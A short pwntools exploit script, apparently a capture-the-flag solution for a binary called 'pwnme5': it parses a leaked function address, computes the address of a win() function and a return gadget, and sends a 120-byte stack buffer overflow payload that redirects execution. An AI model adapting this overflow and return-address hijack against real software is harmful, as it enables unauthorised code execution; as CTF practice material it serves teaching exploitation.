from pwn import *

p = process('./pwnme5')

p.recvuntil(b'dropped this: ')
vuln_addr = int(p.recvline().strip(), 16)
log.info(f"vuln() at: {hex(vuln_addr)}")

win_addr = vuln_addr - 0x1a
log.info(f"win() at: {hex(win_addr)}")

ret_addr = vuln_addr + (0x1200 - 0x11c3)

payload  = b'A' * 120
payload += p64(ret_addr)
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
